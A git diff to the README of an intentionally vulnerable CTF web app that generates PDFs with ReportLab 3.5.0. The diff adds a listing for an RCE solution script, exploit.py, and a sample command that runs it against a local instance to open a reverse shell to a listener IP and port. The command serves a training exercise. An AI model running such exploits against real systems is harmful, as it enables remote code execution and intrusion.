@@ -24,6 +24,7 @@ This app was initially created by me for the WeShieldCyber CTF Event qualifiers,
 ├── app.py              # Main application script.
 ├── docker-compose.yml  # Docker Compose file for containerized setup.
 ├── Dockerfile          # Dockerfile for building the app container.
+├── exploit.py          # Solution RCE Exploit Script by '@sudo.dwg'
 ├── flag.txt            # File containing a secret flag (for CTF challenges).
 ├── LICENSE             # MIT License.
 ├── README.md           # This document.
@@ -73,7 +74,13 @@ This app was initially created by me for the WeShieldCyber CTF Event qualifiers,
 
 Since you are exploring this app for educational purposes, it’s important to understand the potential risks of insecure code practices. For instance, this app uses the ReportLab library (version `3.5.0`) for PDF generation. Improper sanitization of user input in this process can lead to unintended consequences. Learn more about this type of vulnerability in the following article:
 
-- [ReportLab Vulnerabilities in Web Applications](https://rezydev.xyz/research/)
+- [ReportLab Vulnerabilities in Web Applications](https://rezydev.xyz/research/) - *i have not published the blog on this yet*
+- Use `exploit.py` script on this repository using following switches for reverse shell. It's a PoC Script.
+
+```bash
+# python3 exploit.py http://ip:port username password docker0-interface listening-port
+python3 exploit.py http://localhost:3003 rezydev rezydev 172.17.0.1 1337
+```
 
 ---
 
